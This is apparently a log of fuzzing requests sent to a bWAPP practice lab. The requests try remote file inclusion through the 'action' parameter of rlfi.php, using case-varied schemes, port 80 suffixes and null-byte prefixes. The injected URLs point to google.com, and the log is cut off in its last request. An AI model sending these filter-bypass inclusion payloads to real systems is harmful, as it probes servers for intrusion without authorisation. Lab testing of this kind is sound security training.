+GET /bWAPP/rlfi.php?language=lang_nl.php&action=HTTPS%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=HTTPS%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=HtTp%3A%2F%2Fwww.google.com%2F HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=HtTp%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=HtTp%3A%2F%2Fwww.google.com HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=HtTp%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=HtTp%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=HtTpS%3A%2F%2Fwww.google.com%2F HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=HtTpS%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=HtTpS%3A%2F%2Fwww.google.com HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=HtTpS%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=HtTpS%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=%00http%3A%2F%2Fwww.google.com%2F HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=%00http%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=%00http%3A%2F%2Fwww.google.com HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=%00http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=%00http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=%00www.google.com%2F HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=%00www.google.com%3A80%2F HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=%00www.google.com HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=%00www.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=%00www.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=%00HTTP%3A%2F%2Fwww.google.com%2F HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=%00HTTP%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=%00HTTP%3A%2F%2Fwww.google.com HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=%00HTTP%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=%00HTTP%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=%00https%3A%2F%2Fwww.google.com%2F HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=%00https%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=%00https%3A%2F%2Fwww.google.com HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=%00https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=%00https%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=%00HTTPS%3A%2F%2Fwww.google.com%2F HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=%00HTTPS%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=%00HTTPS%3A%2F%2Fwww.google.com HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=%00HTTPS%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=lang_nl.php&action=%00HTTPS%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
